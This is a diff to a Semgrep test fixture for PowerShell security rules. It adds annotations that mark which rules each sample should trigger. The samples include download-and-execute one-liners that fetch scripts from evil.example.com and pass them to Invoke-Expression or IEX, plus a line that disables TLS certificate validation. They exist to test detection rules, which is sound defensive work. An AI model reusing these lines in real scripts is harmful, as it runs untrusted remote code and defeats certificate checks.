@@ -1,8 +1,7 @@
 # Semgrep test fixtures for powershell-unsafe-patterns.yml
 #
 # This file is used by `semgrep --test semgrep-rules/` to validate that each
-# rule matches what it should (ruleid: RULE_ID) and does not match what it
-# should not (ok: RULE_ID).
+# rule matches what it should and does not match what it should not.
 #
 # Reference: https://semgrep.dev/docs/writing-rules/testing-rules/
 #
@@ -14,40 +13,44 @@
 # =============================================================================
 
 function Test-DownloadExecuteBad {
-    # ruleid: powershell-download-execute
+    # ruleid: powershell-download-execute, powershell-webrequest-basic-parsing
     $result = Invoke-WebRequest -Uri "https://evil.example.com/script.ps1"
+    # ruleid: powershell-invoke-expression
     Invoke-Expression $result.Content
 }
 
 function Test-DownloadExecuteIRM {
     # ruleid: powershell-download-execute
     $script = Invoke-RestMethod -Uri "https://evil.example.com/script.ps1"
+    # ruleid: powershell-invoke-expression
     Invoke-Expression $script
 }
 
 function Test-DownloadExecuteInline {
-    # ruleid: powershell-download-execute
+    # ruleid: powershell-download-execute, powershell-invoke-expression, powershell-webrequest-basic-parsing
     Invoke-Expression (Invoke-WebRequest -Uri "https://example.com/run.ps1")
 }
 
 function Test-DownloadExecuteIEX {
-    # ruleid: powershell-download-execute
+    # ruleid: powershell-download-execute, powershell-invoke-expression
     IEX (IWR -Uri "https://example.com/payload.ps1")
 }
 
 function Test-DownloadExecuteIrmIEX {
-    # ruleid: powershell-download-execute
+    # ruleid: powershell-download-execute, powershell-invoke-expression
     IEX (irm "https://example.com/payload.ps1")
 }
 
 function Test-DownloadExecuteIrmVar {
     # ruleid: powershell-download-execute
     $script = irm "https://example.com/payload.ps1"
+    # ruleid: powershell-invoke-expression
     Invoke-Expression $script
 }
 
 function Test-DownloadExecuteOK {
     # ok: powershell-download-execute
+    # todook: powershell-webrequest-basic-parsing
     $result = Invoke-WebRequest -Uri "https://example.com/data.json" -UseBasicParsing
     $data = $result.Content | ConvertFrom-Json
     Write-Output $data
@@ -124,6 +127,7 @@ function Test-EnvVarClientSecret {
 function Test-DisableTLS {
     # ruleid: powershell-disable-certificate-validation
     [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
+    # ruleid: powershell-webrequest-basic-parsing
     Invoke-WebRequest -Uri "https://internal.example.com"
 }
 
